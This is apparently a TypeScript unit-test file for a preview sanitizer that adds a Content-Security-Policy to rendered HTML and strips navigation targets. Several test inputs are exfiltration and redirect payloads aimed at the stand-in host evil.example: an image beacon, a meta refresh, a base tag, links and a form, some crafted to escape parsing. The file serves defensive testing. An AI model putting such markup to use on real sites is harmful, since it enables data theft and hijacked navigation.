import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import {
  formatIqLatency,
  iqTargetKey,
  iqVerdictTone,
  withIqPreviewCsp,
} from '../src/utils/iqTest'

describe('iqTest: 智商检测展示', () => {
  it('用渠道与模型组合出唯一选项 key', () => {
    assert.notEqual(iqTargetKey('c1', 'm1'), iqTargetKey('c2', 'm1'))
    assert.notEqual(iqTargetKey('c1', 'm1'), iqTargetKey('c1', 'm2'))
  })

  it('将判定结果映射为徽标色调', () => {
    assert.equal(iqVerdictTone('passed'), 'success')
    assert.equal(iqVerdictTone('failed'), 'danger')
    assert.equal(iqVerdictTone('incorrect'), 'warning')
    assert.equal(iqVerdictTone('review'), 'warning')
  })

  it('在已有 head 中注入 CSP，并保留原有内容', () => {
    const html = '<!DOCTYPE html><html><head><title>x</title></head><body><svg></svg></body></html>'
    const result = withIqPreviewCsp(html)

    assert.ok(result.includes('Content-Security-Policy'))
    assert.ok(result.includes('<title>x</title>'))
    assert.ok(result.indexOf('Content-Security-Policy') < result.indexOf('<title>x</title>'))
  })

  it('没有 head 时补出 head，片段则包成完整文档', () => {
    const withHtml = withIqPreviewCsp('<html><body><svg></svg></body></html>')
    assert.ok(withHtml.includes('<head><meta http-equiv="Content-Security-Policy"'))

    const fragment = withIqPreviewCsp('<svg></svg>')
    assert.ok(fragment.startsWith('<!DOCTYPE html>'))
    assert.ok(fragment.includes('<body><svg></svg></body>'))
  })

  it('不会把 header 当成 head，也不会放行内联脚本', () => {
    const html = '<html><header>标题</header><body><svg></svg></body></html>'
    const result = withIqPreviewCsp(html)

    assert.ok(result.indexOf('Content-Security-Policy') < result.indexOf('<header>'))
    assert.ok(!result.includes('script-src'))
  })

  it('注释或文本里伪造的 head 不会吞掉 CSP', () => {
    const html = '<!-- <head> --><html><body><img src="https://evil.example/collect?data=内容"></body></html>'
    const result = withIqPreviewCsp(html)

    const csp = result.indexOf('Content-Security-Policy')
    assert.ok(csp > 0)
    assert.ok(csp < result.indexOf('<!-- <head> -->'))
    assert.ok(csp < result.indexOf('<img'))
  })

  it('属性值中的 > 不会让导航目标逃逸清洗', () => {
    const html = '<html><body>' +
      '<a title=">" href="https://evil.example/collect?data=内容">查看作品</a>' +
      '<meta title=">" http-equiv="refresh" content="0;url=https://evil.example/refresh">' +
      '<base href="https://evil.example/">' +
      '</body></html>'
    const result = withIqPreviewCsp(html)

    assert.ok(!result.includes('evil.example'))
    assert.ok(result.includes('查看作品'))
  })

  it('移除链接和表单的导航目标', () => {
    const html = '<html><body><a href="https://evil.example/x" target="_top">点击</a>' +
      '<form action="https://evil.example/post" method="post"></form><svg></svg></body></html>'
    const result = withIqPreviewCsp(html)

    assert.ok(!result.includes('evil.example'))
    assert.ok(result.includes('点击'))
  })

  it('耗时按毫秒与秒展示', () => {
    assert.equal(formatIqLatency(800), '800 ms')
    assert.equal(formatIqLatency(12_340), '12.3 s')
    assert.equal(formatIqLatency(-1), '—')
  })
})
